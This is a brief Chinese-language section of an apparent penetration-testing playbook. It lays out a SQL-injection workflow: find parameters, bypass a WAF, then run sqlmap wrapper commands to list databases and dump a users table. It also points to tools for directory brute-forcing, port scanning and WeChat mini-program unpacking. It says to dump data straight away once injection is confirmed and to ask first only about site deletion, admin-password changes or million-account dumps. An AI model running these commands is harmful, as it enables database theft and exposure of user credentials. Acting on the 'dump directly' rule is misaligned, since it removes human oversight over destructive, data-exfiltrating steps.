## 2. sqlmap 阶梯（授权内）

```
80/443 开 → 认 Web → 找参数（GET/POST）→ waf_sqli_bypass
  → sqlmap_kit ladder --dbs/--tables/--columns/--dump
```

```bash
python3 炼蛊房/sqlmap_kit.py ladder \
  --url 'https://授权/page?id=1' -p id --case <案>

python3 炼蛊房/sqlmap_kit.py ladder \
  --url 'https://授权/page?id=1' -p id -D app -T users --case <案>
```

授权内确认注入后 **dump 直接做**。先问只剩：耗余额、删站、改原超管密、**百万级拖号**。  
签名墙仍先 `waf_sqli_bypass`，不要裸 sqlmap 硬撞。

目录爆破走 `strike` / `sensitive-dir-dump`。端口走 `portscan` / `auto_campaign`。  
微信解包优先 unveilr，备选本机 `wxapp-unpacker` 再交 `wxmini-static-audit`。
